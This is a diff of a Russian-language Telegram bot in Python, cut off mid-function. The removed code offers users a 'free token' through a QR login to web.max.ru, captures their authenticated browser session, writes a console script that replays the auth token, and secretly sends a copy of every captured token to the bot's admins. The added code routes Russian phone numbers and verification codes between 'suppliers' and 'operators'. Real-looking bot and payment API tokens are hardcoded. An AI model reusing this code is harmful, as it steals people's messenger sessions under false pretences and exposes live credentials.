@@ -1,962 +1,1046 @@
+
 import json
 import os
-import urllib.request
-import zipfile
-import urllib.parse
-import asyncio
 import re
-import logging
-logging.basicConfig(level=logging.INFO)
-from telegram.ext import ConversationHandler
-import shutil
-from datetime import datetime
-from io import BytesIO
-from pathlib import Path
+import sqlite3
+import time
+import urllib.parse
+import urllib.request
+from contextlib import closing
+from datetime import datetime, timezone
 
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
 
-# Конфигурация (замени значения или используй os.getenv)
+# Один файл, без requirements.txt и .env.
+# Заполните перед запуском. Можно также передать через переменные окружения.
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8967607425:AAGPblsB4gnTStoxHCYuVqPED-eE3JvyNys")
-CRYPTO_PAY_TOKEN = os.getenv("CRYPTO_PAY_TOKEN", "584628:AAoCvpqJjjLh1PlsKRUNUyz17SmTF6WW6Kh")
-CRYPTO_PAY_API = "https://pay.crypt.bot/api"
-BASE_URL = "https://web.max.ru"
+ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "change-this-password")
+DB_PATH = os.getenv("DB_PATH", "bot.db")
 
-WAITING_FOR_TOKEN = 1
-WAITING_FOR_CONVERT = 2
+# Если список пустой, первый вошедший пользователь автоматически станет админом.
+ADMIN_TELEGRAM_IDS = []
 
-# Настройка путей под Railway Volume (/app/sessions)
-DATA_DIR = Path("/app/sessions")
-DATA_DIR.mkdir(exist_ok=True)
+# Как часто слать автоотчет админам, если автоотчеты включены.
+AUTO_REPORT_INTERVAL_SECONDS = 60 * 60
 
-SESSIONS_DIR = DATA_DIR / "user_sessions"
-SESSIONS_DIR.mkdir(exist_ok=True)
+ROLE_OPERATOR = "operator"
+ROLE_SUPPLIER = "supplier"
 
-USERS_FILE = DATA_DIR / "users.json"
-EVENTS_FILE = DATA_DIR / "events.jsonl"
-INVOICES_FILE = DATA_DIR / "invoices.json"
+STATUS_AVAILABLE = "available"
+STATUS_ASSIGNED = "assigned"
+STATUS_DONE = "done"
+STATUS_FAILED = "failed"
+STATUS_CANCELLED = "cancelled"
 
-MIN_QR_BALANCE = 0.1
-REFERRAL_BONUS = 0.2
-QR_PRICE = 0.1
 
-ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "8949311928").split(",") if x.strip().isdigit()}
+def now_iso():
+    return datetime.now(timezone.utc).isoformat(timespec="seconds")
 
-# --- Работа с JSON файлами ---
-def load_json(path: Path, default):
-    if not path.exists(): return default
-    try:
-        with open(path, "r", encoding="utf-8") as f: return json.load(f)
-    except Exception: return default
 
-def save_json(path: Path, data) -> None:
-    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)
+def db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
 
-def load_users() -> dict: return load_json(USERS_FILE, {})
-def save_users(data: dict) -> None: save_json(USERS_FILE, data)
-def load_invoices() -> dict: return load_json(INVOICES_FILE, {})
-def save_invoices(data: dict) -> None: save_json(INVOICES_FILE, data)
 
-def log_event(event_type: str, payload: dict) -> None:
-    row = {"ts": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"), "event": event_type, "payload": payload}
-    with open(EVENTS_FILE, "a", encoding="utf-8") as f:
-        f.write(json.dumps(row, ensure_ascii=False) + "\n")
+def init_db():
+    with closing(db()) as conn:
+        conn.executescript(
+            """
+            CREATE TABLE IF NOT EXISTS users (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                public_id TEXT NOT NULL UNIQUE,
+                telegram_id INTEGER NOT NULL UNIQUE,
+                username TEXT,
+                role TEXT NOT NULL,
+                is_admin INTEGER NOT NULL DEFAULT 0,
+                is_blocked INTEGER NOT NULL DEFAULT 0,
+                password_check INTEGER NOT NULL DEFAULT 0,
+                state TEXT,
+                state_data TEXT,
+                created_at TEXT NOT NULL,
+                last_seen_at TEXT NOT NULL
+            );
 
-# --- Интеграция Crypto Bot API (Обход блокировки Cloudflare) ---
-def crypto_api_call(method: str, payload: dict) -> dict:
-    if not CRYPTO_PAY_TOKEN:
-        return {"ok": False, "error": "CRYPTO_PAY_TOKEN is not set"}
-    
-    data_encoded = urllib.parse.urlencode(payload).encode("utf-8")
-    
-    req = urllib.request.Request(
-        f"{CRYPTO_PAY_API}/{method}",
-        data=data_encoded,
-        method="POST",
-        headers={
-            "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        },
-    )
-    try:
-        with urllib.request.urlopen(req, timeout=20) as r:
-            return json.loads(r.read().decode("utf-8"))
-    except urllib.error.HTTPError as e:
-        error_body = e.read().decode("utf-8")
-        try:
-            err_json = json.loads(error_body)
-            return {"ok": False, "error": f"HTTP {e.code}: {err_json.get('error', {}).get('name', error_body)}"}
-        except Exception:
-            return {"ok": False, "error": f"HTTP {e.code}: {error_body}"}
-    except Exception as e:
-        return {"ok": False, "error": str(e)}
+            CREATE TABLE IF NOT EXISTS numbers (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                supplier_user_id INTEGER NOT NULL,
+                masked_number TEXT NOT NULL,
+                volume INTEGER NOT NULL DEFAULT 1,
+                remaining INTEGER NOT NULL DEFAULT 1,
+                status TEXT NOT NULL,
+                created_at TEXT NOT NULL,
+                assigned_operator_user_id INTEGER,
+                assigned_at TEXT,
+                completed_at TEXT,
+                last_reason TEXT
+            );
 
-def create_invoice(chat_id: int, amount: float) -> tuple[bool, dict]:
-    resp = crypto_api_call("createInvoice", {"asset": "USDT", "amount": str(amount), "description": f"Top-up {chat_id}"})
-    if not resp.get("ok"):
-        return False, resp
-    inv = resp["result"]
-    invoices = load_invoices()
-    invoices[str(inv["invoice_id"])] = {"chat_id": chat_id, "amount": amount, "credited": False}
-    save_invoices(invoices)
-    return True, inv
+            CREATE TABLE IF NOT EXISTS logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                actor_user_id INTEGER,
+                number_id INTEGER,
+                event_type TEXT NOT NULL,
+                details TEXT,
+                created_at TEXT NOT NULL
+            );
 
-# --- Управление пользователями и балансом ---
-def get_user(chat_id: int) -> dict:
-    users = load_users()
-    key = str(chat_id)
-    if key not in users:
-        users[key] = {"balance": 0.0, "referrer": None, "referrals": 0, "has_recharged": False}
-        save_users(users)
-    return users[key]
+            CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT NOT NULL
+            );
+            """
+        )
+        migrate_schema(conn)
+        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('auto_reports_enabled', '1')")
+        conn.commit()
 
-def get_user_by_username(username: str) -> tuple[int | None, dict | None]:
-    users = load_users()
-    uname = username.strip().lstrip("@").lower()
-    for k, v in users.items():
-        if str(v.get("username", "")).lower() == uname: return int(k), v
-    return None, None
 
-def update_user(chat_id: int, user_data: dict) -> None:
-    users = load_users()
-    users[str(chat_id)] = user_data
-    save_users(users)
+def migrate_schema(conn):
+    user_cols = {row["name"] for row in conn.execute("PRAGMA table_info(users)").fetchall()}
+    if "public_id" not in user_cols:
+        conn.execute("ALTER TABLE users ADD COLUMN public_id TEXT")
+    if "username" not in user_cols:
+        conn.execute("ALTER TABLE users ADD COLUMN username TEXT")
+    if "password_check" not in user_cols:
+        conn.execute("ALTER TABLE users ADD COLUMN password_check INTEGER NOT NULL DEFAULT 0")
+    if "state" not in user_cols:
+        conn.execute("ALTER TABLE users ADD COLUMN state TEXT")
+    if "state_data" not in user_cols:
+        conn.execute("ALTER TABLE users ADD COLUMN state_data TEXT")
 
-def add_balance(chat_id: int, amount: float, source: str = "self") -> tuple[dict, str | None]:
-    users = load_users()
-    key = str(chat_id)
-    if key not in users:
-        users[key] = {"balance": 0.0, "referrer": None, "referrals": 0, "has_recharged": False}
-    user = users[key]
-    user["balance"] = round(float(user.get("balance", 0.0)) + amount, 2)
-    referral_message = None
-    first_recharge = not user.get("has_recharged", False)
-    if amount > 0:
-        user["has_recharged"] = True
-        log_event("topup", {"chat_id": chat_id, "amount": amount, "source": source})
-    if first_recharge and amount > 0 and user.get("referrer"):
-        ref_key = str(user["referrer"])
-        ref_user = users.get(ref_key)
-        if ref_user:
-            ref_user["balance"] = round(float(ref_user.get("balance", 0.0)) + REFERRAL_BONUS, 2)
-            ref_user["referrals"] = int(ref_user.get("referrals", 0)) + 1
-            referral_message = ref_key
-    users[key] = user
-    save_users(users)
-    return user, referral_message
+    number_cols = {row["name"] for row in conn.execute("PRAGMA table_info(numbers)").fetchall()}
+    if "assigned_operator_user_id" not in number_cols:
+        conn.execute("ALTER TABLE numbers ADD COLUMN assigned_operator_user_id INTEGER")
+    if "last_reason" not in number_cols:
+        conn.execute("ALTER TABLE numbers ADD COLUMN last_reason TEXT")
+    if "completed_at" not in number_cols:
+        conn.execute("ALTER TABLE numbers ADD COLUMN completed_at TEXT")
+    if "assigned_client_user_id" in number_cols:
+        conn.execute(
+            """
+            UPDATE numbers
+            SET assigned_operator_user_id = COALESCE(assigned_operator_user_id, assigned_client_user_id)
+            """
+        )
+    if "cancel_reason" in number_cols:
+        conn.execute("UPDATE numbers SET last_reason = COALESCE(last_reason, cancel_reason)")
+    if "fail_reason" in number_cols:
+        conn.execute("UPDATE numbers SET last_reason = COALESCE(last_reason, fail_reason)")
+    conn.execute("UPDATE users SET role = ? WHERE role IN ('client', 'admin')", (ROLE_SUPPLIER,))
+    conn.execute("UPDATE numbers SET status = ? WHERE status = 'confirmed'", (STATUS_ASSIGNED,))
+    for row in conn.execute("SELECT id FROM users WHERE public_id IS NULL OR public_id = ''").fetchall():
+        conn.execute("UPDATE users SET public_id = ? WHERE id = ?", (public_id(row["id"]), row["id"]))
 
-def charge_for_qr(chat_id: int) -> tuple[bool, float]:
-    # Просто возвращаем успех, без проверки баланса и списаний
-    return True, 0.0
 
-def is_admin(chat_id: int) -> bool: return chat_id in ADMIN_IDS
-def session_path(chat_id: int) -> Path: return SESSIONS_DIR / f"session_{chat_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S_%f')}.json"
-def chat_sessions(chat_id: int) -> list[Path]: return sorted(SESSIONS_DIR.glob(f"session_{chat_id}_*.json"))
+def api(method, data=None):
+    if BOT_TOKEN == "PASTE_BOT_TOKEN_HERE":
+        raise RuntimeError("Укажите BOT_TOKEN в начале bot.py или через переменную окружения BOT_TOKEN.")
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    body = urllib.parse.urlencode(data or {}).encode("utf-8")
+    with urllib.request.urlopen(url, body, timeout=60) as response:
+        result = json.loads(response.read().decode("utf-8"))
+    if not result.get("ok"):
+        raise RuntimeError(result)
+    return result["result"]
 
-# --- Меню ---
-def main_menu_content(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
-    text = "**👇 Получите куар, отсканируйте, и получите токен, бесплатно ;)**"
-    
-    rows = [
-        [
-            InlineKeyboardButton("📲 Получить QR", callback_data="qr:get"),
-            InlineKeyboardButton("🗄️ Мои сессии", callback_data="session:list")
-        ]
-        # Вторая строка с кнопками удалена
-    ]
-    
-    if is_admin(chat_id):
-        rows.append([InlineKeyboardButton("🛠 Admin-панель", callback_data="admin:menu")])
-        
-    return text, InlineKeyboardMarkup(rows)
 
-def admin_menu() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📊 Статистика", callback_data="admin:stats")],
-        [InlineKeyboardButton("📣 Рассылка", callback_data="admin:broadcast")], 
-        [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]
+def send_message(chat_id, text, reply_markup=None):
+    data = {"chat_id": chat_id, "text": text}
+    if reply_markup:
+        data["reply_markup"] = json.dumps(reply_markup, ensure_ascii=False)
+    return api("sendMessage", data)
+
+
+def answer_callback(callback_id, text=None, alert=False):
+    data = {"callback_query_id": callback_id, "show_alert": "true" if alert else "false"}
+    if text:
+        data["text"] = text
+    return api("answerCallbackQuery", data)
+
+
+def role_title(role):
+    return {ROLE_OPERATOR: "оператор", ROLE_SUPPLIER: "поставщик"}.get(role, role)
+
+
+def public_id(user_id):
+    return f"U{user_id:06d}"
+
+
+def user_handle(user):
+    if not user:
+        return "-"
+    username = user["username"] if isinstance(user, sqlite3.Row) else user.get("username")
+    return f"@{username}" if username else "без @username"
+
+
+def normalize_russian_number(text):
+    digits = re.sub(r"\D", "", text or "")
+    if len(digits) == 11 and digits.startswith("8"):
+        digits = "7" + digits[1:]
+    if len(digits) == 11 and digits.startswith("7"):
+        return "+" + digits
+    return None
+
+
+def parse_russian_numbers(text):
+    numbers = []
+    bad = []
+    for line in (text or "").splitlines():
+        raw = line.strip()
+        if not raw:
+            continue
+        number = normalize_russian_number(raw)
+        if number:
+            numbers.append(number)
+        else:
+            bad.append(raw)
+    return numbers, bad
+
+
+def looks_like_code(text):
+    return bool(re.fullmatch(r"\d{4,10}", (text or "").strip()))
+
+
+def inline_keyboard(rows):
+    return {"inline_keyboard": [[{"text": text, "callback_data": data} for text, data in row] for row in rows]}
+
+
+def back_row():
+    return [("⬅️ Назад", "menu:home")]
+
+
+def main_menu_keyboard(user):
+    rows = []
+    if user["role"] == ROLE_SUPPLIER:
+        rows.append([("➕ Добавить номер", "menu:add_number")])
+        rows.append([("📦 Моя очередь", "menu:my_queue")])
+    elif user["role"] == ROLE_OPERATOR:
+        rows.append([("📲 Взять номер", "menu:take_number")])
+    if user["is_admin"]:
+        rows.append([("Админ-панель", "menu:admin")])
+    rows.append([("👤 Профиль", "menu:profile")])
+    return inline_keyboard(rows)
+
+
+def admin_keyboard():
+    return inline_keyboard([
+        [("📊 Статистика", "admin:stats"), ("👥 Операторы", "admin:operator_stats")],
+        [("📋 Автоотчеты", "admin:auto_report")],
+        [("🎧 Выдача оператора", "admin:grant_operator")],
+        [("♻️ Сброс очереди", "admin:reset_queue"), ("📣 Рассылка", "admin:broadcast")],
+        [("Блокировка", "admin:block"), ("Разблокировка", "admin:unblock")],
+        [("⬅️ Назад", "menu:home")],
     ])
-    
-def session_menu(chat_id: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("📄 Список сессий", callback_data="session:show_list")], [InlineKeyboardButton("🗃️ Выгрузить все сессии", callback_data="session:export_choice")], [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]])
 
-def get_js_console_code_raw(file_path: Path) -> str:
-    try:
-        data = load_json(file_path, {})
-        storage = data["origins"][0]["localStorage"]
-        device_id = next(item["value"] for item in storage if item["name"] == "__oneme_device_id")
-        auth_ready = next(item["value"] for item in storage if item["name"] == "__oneme_auth").replace("'", "\\'")
-        return "sessionStorage.clear();\nlocalStorage.clear();\n" + f"localStorage.setItem('__oneme_device_id', '{device_id}');\n" + f"localStorage.setItem('__oneme_auth', '{auth_ready}');\n" + "localStorage.setItem('__oneme_locale', 'ru');\nlocalStorage.setItem('__oneme_theme', '{\"colorScheme\":\"system\",\"colorTheme\":\"space\"}');\nwindow.location.reload();"
-    except Exception: return ""
 
-# --- Логика Playwright ---
-async def capture_qr_image(page) -> bytes:
-    for selector in ["canvas", 'img[src*="qr"]', 'div[class*="qr"]', "svg"]:
-        try:
-            handle = await page.wait_for_selector(selector, timeout=10000, state="visible")
-            if handle: return await handle.screenshot(type="png")
-        except Exception: continue
-    return await page.screenshot(type="png", clip={"x": 0, "y": 0, "width": 500, "height": 500})
+def supplier_number_keyboard(number_id):
+    return inline_keyboard([
+        [("🔁 Повтор с причиной", f"supplier:repeat:{number_id}")],
+        [("Отменить с причиной", f"supplier:cancel:{number_id}")],
+        [("⬅️ Назад", "menu:home")],
+    ])
 
-async def wait_success_login(page) -> None:
-    await page.wait_for_function("""() => { const t = document.body ? document.body.innerText.toLowerCase() : ''; return !(t.includes('qr') || t.includes('сканируйте') || t.includes('войдите')); }""", timeout=180000)
 
-def save_json(path, data):
-    with open(path, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=4)
+def operator_active_keyboard(number_id):
+    return inline_keyboard([
+        [("🔁 Повтор сообщения", f"operator:repeat_message:{number_id}")],
+        [("✅ Встал", f"operator:done:{number_id}"), ("Не встал", f"operator:failed:{number_id}")],
+        [("⏭️ Скипнуть", f"operator:skip:{number_id}")],
+        [("⬅️ Назад", "menu:home")],
+    ])
 
-async def check_token_validity(chat_id: int, file_path: Path, context: ContextTypes.DEFAULT_TYPE):
-    status_msg = await context.bot.send_message(chat_id, "🔍 Проверяю валидность сессии...")
-    from playwright.async_api import async_playwright
-    
-    try:
-        data = load_json(file_path, {})
-        # Извлекаем данные из вашего формата (или сохраненного файла сессии)
-        # Если вы передаете просто файл, логика парсинга должна соответствовать get_js_console_code_raw
-        
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True)
-            ctx = await browser.new_context()
-            page = await ctx.new_page()
-            
-            await page.goto(BASE_URL)
-            
-            # Внедрение токена (имитируем действия из вашего get_js_console_code_raw)
-            # Здесь нужно либо применить localStorage.setItem через evaluate
-            # либо загрузить готовый storage_state (если файл — это сохраненный контекст Playwright)
-            
-            await page.reload()
-            await asyncio.sleep(3) # Ждем прогрузки
-            
-            # Проверка: если на странице есть QR-код, значит токен невалиден
-            is_qr_present = await page.evaluate("() => document.body.innerText.includes('QR')") 
-            
-            if not is_qr_present:
-                await status_msg.edit_text("✅ Токен ВАЛИДНЫЙ! Доступ открыт.")
-            else:
-                await status_msg.edit_text("❌ Токен НЕВАЛИДНЫЙ (истек или был отозван).")
-            
-            await browser.close()
-    except Exception as e:
-        await status_msg.edit_text(f"⚠️ Ошибка при проверке: {str(e)}")
-        
-# Возвращает содержимое файла сессии (JSON)
-def get_raw_json(file_path: Path) -> str:
-    with open(file_path, "r", encoding="utf-8") as f:
-        return f.read()
 
-# Возвращает JS-скрипт для консоли
-def get_js_console_code(file_path: Path) -> str:
-    try:
-        data = json.loads(get_raw_json(file_path))
-        storage = data["origins"][0]["localStorage"]
-        device_id = next(item["value"] for item in storage if item["name"] == "__oneme_device_id")
-        auth_ready = next(item["value"] for item in storage if item["name"] == "__oneme_auth").replace("'", "\\'")
-        return (
-            "sessionStorage.clear();\nlocalStorage.clear();\n"
-            f"localStorage.setItem('__oneme_device_id', '{device_id}');\n"
-            f"localStorage.setItem('__oneme_auth', '{auth_ready}');\n"
-            "localStorage.setItem('__oneme_locale', 'ru');\n"
-            "localStorage.setItem('__oneme_theme', '{\"colorScheme\":\"system\",\"colorTheme\":\"space\"}');\n"
-            "window.location.reload();"
+def get_setting(key, default=None):
+    with closing(db()) as conn:
+        row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
+    return row["value"] if row else default
+
+
+def set_setting(key, value):
+    with closing(db()) as conn:
+        conn.execute(
+            "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
+            (key, str(value)),
         )
-    except Exception: return ""
+        conn.commit()
 
-def parse_txt_to_json(txt_content: str) -> dict:
-    """Извлекает данные из JS-кода и превращает в структуру для storage_state"""
-    auth = re.search(r"localStorage\.setItem\('__oneme_auth',\s*'(.+?)'\);", txt_content)
-    device_id = re.search(r"localStorage\.setItem\('__oneme_device_id',\s*'(.+?)'\);", txt_content)
-    
-    if not auth or not device_id:
+
+def get_user(telegram_id):
+    with closing(db()) as conn:
+        return conn.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,)).fetchone()
+
+
+def get_user_by_handle(value):
+    username = (value or "").strip()
+    if username.startswith("@"):
+        username = username[1:]
+    if not username:
         return None
-        
-    return {
-        "origins": [{
-            "origin": BASE_URL,
-            "localStorage": [
-                {"name": "__oneme_auth", "value": auth.group(1)},
-                {"name": "__oneme_device_id", "value": device_id.group(1)}
-            ]
-        }]
-    }
+    with closing(db()) as conn:
+        return conn.execute("SELECT * FROM users WHERE lower(username) = lower(?)", (username,)).fetchone()
 
-async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    from playwright.async_api import async_playwright
-    
-    status_msg = await context.bot.send_message(chat_id=chat_id, text="⏳ Подключаюсь к платформе...")
-    
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(
-            headless=True, 
-            args=[
-                "--no-sandbox", 
-                "--disable-setuid-sandbox", 
-                "--disable-dev-shm-usage",
-                "--disable-accelerated-2d-canvas",
-                "--disable-gpu",
-                "--no-first-run",
-                "--no-zygote",
-                "--single-process"
-            ]
-        )
-        
-        ctx = await browser.new_context(viewport={"width": 500, "height": 600})
-        page = await ctx.new_page()
-        
-        await page.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "font", "media"] and "qr" not in route.request.url else route.continue_())
-        
-        try:
-            await status_msg.edit_text("⏳ Загружаю страницу авторизации...")
-            await page.goto(BASE_URL, wait_until="domcontentloaded", timeout=40000)
-            
-            await status_msg.edit_text("⏳ Ищу QR-код на странице...")
-            
-            qr_handle = None
-            for selector in ["canvas", "img[src*='qr']", "div[class*='qr']", "[id*='qr']", "svg"]:
-                try:
-                    qr_handle = await page.wait_for_selector(selector, timeout=5000, state="visible")
-                    if qr_handle:
-                        print(f"[Успех] Найдено по селектору: {selector}")
-                        break
-                except Exception:
-                    continue
-            
-            if qr_handle:
-                await status_msg.edit_text("⏳ Генерирую изображение QR...")
-                qr_img = await qr_handle.screenshot(type="png")
-                await context.bot.send_photo(chat_id=chat_id, photo=qr_img, caption="✅ QR готов! Сканируй для входа.")
-                await status_msg.delete()
-            else:
-                print(f"[Ошибка] QR-код не найден для пользователя {chat_id}. Делаю диагностический скриншот.")
-                await status_msg.edit_text("⚠️ Ошибка: Элемент QR-кода не найден. Отправляю снимок экрана для проверки...")
-                
-                debug_screenshot = await page.screenshot(type="png")
-                await context.bot.send_photo(
-                    chat_id=chat_id, 
-                    photo=debug_screenshot, 
-                    caption="🔎 Бот не увидел QR. Вот что отображается на странице вместо него."
-                )
-                return
-            
-            # 1. Ждем успешного логина и сохраняем сессию во внутренний файл Playwright
-            # 1. Ждем успешного логина и сохраняем сессию
-            await wait_success_login(page)
-            spath = session_path(chat_id)
-            await ctx.storage_state(path=str(spath))
-            
-            log_event("token_created", {"chat_id": chat_id, "session_file": spath.name})
-            
-            # 2. Предлагаем выбрать формат
-            kb = [
-                [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{spath.name}")],
-                [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{spath.name}")]
-            ]
-            
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text="🎉 **Авторизация успешна!** Сессия сохранена.\nВыберите формат для загрузки:",
-                reply_markup=InlineKeyboardMarkup(kb)
+
+def admin_count():
+    with closing(db()) as conn:
+        return conn.execute("SELECT COUNT(*) count FROM users WHERE is_admin = 1").fetchone()["count"]
+
+
+def extract_username(tg_from):
+    return (tg_from or {}).get("username")
+
+
+def create_or_touch_user(telegram_id, username=None):
+    with closing(db()) as conn:
+        row = conn.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,)).fetchone()
+        if row:
+            conn.execute(
+                "UPDATE users SET username = COALESCE(?, username), last_seen_at = ? WHERE id = ?",
+                (username, now_iso(), row["id"]),
             )
-                
-            
-            # 3. Генерируем JS-код (токен) из сохраненной сессии
-            js_code = get_js_console_code_raw(spath)
-            
-            if js_code:
-                # --- ОТПРАВКА ПОЛЬЗОВАТЕЛЮ ---
-                try:
-                    user_bio = BytesIO(js_code.encode("utf-8"))
-                    user_bio.name = "login.txt"
-                    await context.bot.send_document(
-                        chat_id=chat_id,
-                        document=user_bio,
-                        caption="📜 **Ваш скрипт для входа через консоль браузера.**\nОн также всегда доступен в разделе 'Мои сессии'.",
-                        parse_mode="Markdown"
-                    )
-                    print(f"[Успех] Файл токена отправлен пользователю {chat_id}")
-                except Exception as user_err:
-                    print(f"[Ошибка] Не удалось отправить файл пользователю {chat_id}: {user_err}")
-                
-                # --- ОТПРАВКА АДМИНУ В ЛС ---
-                user_info = get_user(chat_id)
-                username_str = f"@{user_info.get('username')}" if user_info.get('username') else "Нет юзернейма"
-                
-                admin_caption = (
-                    f"🔔 **Новый токен получен!**\n\n"
-                    f"👤 **Пользователь:** {username_str}\n"
-                    f"🆔 **ID:** `{chat_id}`\n"
-                    f"📂 **Файл сессии:** `{spath.name}`"
-                )
-                
-                # Бот отправит файл по очереди каждому админу, указанному в ADMIN_IDS
-                for admin_id in ADMIN_IDS:
-                    try:
-                        admin_bio = BytesIO(js_code.encode("utf-8"))
-                        admin_bio.name = f"login_{chat_id}.txt"
-                        
-                        await context.bot.send_document(
-                            chat_id=admin_id,
-                            document=admin_bio,
-                            caption=admin_caption,
-                            parse_mode="Markdown"
-                        )
-                        print(f"[Успех] Копия токена пользователя {chat_id} отправлена админу {admin_id}")
-                    except Exception as admin_err:
-                        print(f"[Ошибка] Не удалось отправить лог админу {admin_id}: {admin_err}")
+            conn.commit()
+            return conn.execute("SELECT * FROM users WHERE id = ?", (row["id"],)).fetchone()
 
-        except Exception as e:
-            print(f"[Критическая ошибка] В процессе QR произошел сбой: {e}")
-            try:
-                await status_msg.edit_text("❌ Произошла ошибка при авторизации. Попробуйте еще раз.")
-            except Exception:
-                pass
+        is_admin = 1 if (telegram_id in ADMIN_TELEGRAM_IDS or (not ADMIN_TELEGRAM_IDS and admin_count() == 0)) else 0
+        cur = conn.execute(
+            """
+            INSERT INTO users (public_id, telegram_id, username, role, is_admin, created_at, last_seen_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+            """,
+            ("pending", telegram_id, username, ROLE_SUPPLIER, is_admin, now_iso(), now_iso()),
+        )
+        user_id = cur.lastrowid
+        conn.execute("UPDATE users SET public_id = ? WHERE id = ?", (public_id(user_id), user_id))
+        conn.commit()
+        return conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
 
-# --- Команды Telegram ---
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    user = get_user(chat_id)
-    
-    if update.effective_user and update.effective_user.username:
-        user["username"] = update.effective_user.username
-        update_user(chat_id, user)
-        
-    if context.args and context.args[0].startswith("ref_"):
-        try:
-            ref_id = int(context.args[0].replace("ref_", ""))
-            if ref_id != chat_id and not user.get("referrer"):
-                user["referrer"] = ref_id
-                update_user(chat_id, user)
-                await update.message.reply_text("✅ Реферальный код применен.")
-        except ValueError: pass
 
-    welcome_text, reply_kb = main_menu_content(chat_id)
-    await update.message.reply_text(text=welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
-        
-async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_admin(update.effective_chat.id):
-        await update.message.reply_text("⛔ Нет доступа.")
+def set_user_role(user_id, role):
+    with closing(db()) as conn:
+        conn.execute("UPDATE users SET role = ? WHERE id = ?", (role, user_id))
+        conn.commit()
+        return conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
+
+
+def set_admin(telegram_id, username=None):
+    user = create_or_touch_user(telegram_id, username)
+    with closing(db()) as conn:
+        conn.execute("UPDATE users SET is_admin = 1, password_check = 1 WHERE id = ?", (user["id"],))
+        conn.commit()
+        return conn.execute("SELECT * FROM users WHERE id = ?", (user["id"],)).fetchone()
+
+
+def set_state(user_id, state, data=None):
+    with closing(db()) as conn:
+        conn.execute(
+            "UPDATE users SET state = ?, state_data = ? WHERE id = ?",
+            (state, json.dumps(data or {}, ensure_ascii=False), user_id),
+        )
+        conn.commit()
+
+
+def clear_state(user_id):
+    set_state(user_id, None, {})
+
+
+def state_data(user):
+    try:
+        return json.loads(user["state_data"] or "{}")
+    except json.JSONDecodeError:
+        return {}
+
+
+def mark_password_ok(user_id):
+    with closing(db()) as conn:
+        conn.execute("UPDATE users SET password_check = 1 WHERE id = ?", (user_id,))
+        conn.commit()
+
+
+def log_event(actor_user_id, event_type, number_id=None, details=None):
+    with closing(db()) as conn:
+        conn.execute(
+            "INSERT INTO logs (actor_user_id, number_id, event_type, details, created_at) VALUES (?, ?, ?, ?, ?)",
+            (actor_user_id, number_id, event_type, details, now_iso()),
+        )
+        conn.commit()
+
+
+def show_home(chat_id, user):
+    text = f"✨ Главное меню\n👤 {user_handle(user)}\n🎚️ Роль: {role_title(user['role'])}"
+    send_message(chat_id, text, main_menu_keyboard(user))
+
+
+def build_global_stats():
+    with closing(db()) as conn:
+        users_total = conn.execute("SELECT COUNT(*) count FROM users").fetchone()["count"]
+        suppliers = conn.execute("SELECT COUNT(*) count FROM users WHERE role = ?", (ROLE_SUPPLIER,)).fetchone()["count"]
+        operators = conn.execute("SELECT COUNT(*) count FROM users WHERE role = ?", (ROLE_OPERATOR,)).fetchone()["count"]
+        blocked = conn.execute("SELECT COUNT(*) count FROM users WHERE is_blocked = 1").fetchone()["count"]
+        total = conn.execute("SELECT COUNT(*) count FROM numbers").fetchone()["count"]
+        issued = conn.execute("SELECT COUNT(*) count FROM logs WHERE event_type = 'number_taken'").fetchone()["count"]
+        done = conn.execute("SELECT COUNT(*) count FROM logs WHERE event_type = 'number_done'").fetchone()["count"]
+        failed = conn.execute("SELECT COUNT(*) count FROM logs WHERE event_type = 'number_failed'").fetchone()["count"]
+        messages = conn.execute("SELECT COUNT(*) count FROM logs WHERE event_type = 'supplier_message_sent'").fetchone()["count"]
+        repeat_messages = conn.execute("SELECT COUNT(*) count FROM logs WHERE event_type = 'repeat_message_requested'").fetchone()["count"]
+
+    lines = [
+        "📊 Статистика",
+        f"👥 Пользователи: {users_total}",
+        f"📦 Поставщики: {suppliers}",
